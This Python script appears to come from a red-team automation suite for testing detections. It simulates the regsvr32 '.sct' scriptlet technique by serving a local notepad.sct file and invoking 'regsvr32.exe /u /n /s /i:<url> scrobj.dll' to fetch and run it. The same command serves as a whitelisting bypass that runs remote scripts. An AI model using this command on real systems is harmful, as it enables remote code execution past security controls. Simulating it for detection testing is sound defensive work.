"""
Name: RegSvr32 Backdoor with .sct Files
RTA: regsvr32_scrobj.py
ATT&CK: T1121, T1117, T1064
Description:
The regsvr32_scrobj.py script simulates loading a malicious `.sct` (scriptlet) file using `regsvr32.exe`.
This technique can be used for bypassing application whitelisting and executing remote scripts.
Key Features:
- .sct Backdoor: Executes a remote .sct (scriptlet) file using RegSvr32, simulating how attackers bypass whitelisting solutions.
- Remote Script Execution: The script creates a simple web server to host the .sct file.
- Windows-Specific: Since RegSvr32 is a Windows utility, this script is Windows-only.
"""

import platform
import common


@common.dependencies(common.get_path("bin", "notepad.sct"))
def main():
    # Ensure script only runs on Windows
    if platform.system() != 'Windows':
        common.log("This script only runs on Windows.")
        return common.UNSUPPORTED_RTA

    common.log("RegSvr32 with .sct backdoor")
    server, ip, port = common.serve_web()
    common.clear_web_cache()

    uri = 'bin/notepad.sct'
    url = 'http://%s:%d/%s' % (ip, port, uri)

    common.execute(["regsvr32.exe", "/u", "/n", "/s", "/i:%s" % url, "scrobj.dll"])
    common.log("Killing all notepads to cleanup", "-")
    common.execute(["taskkill", "/f", "/im", "notepad.exe"])

    server.shutdown()


if __name__ == "__main__":
    exit(main())
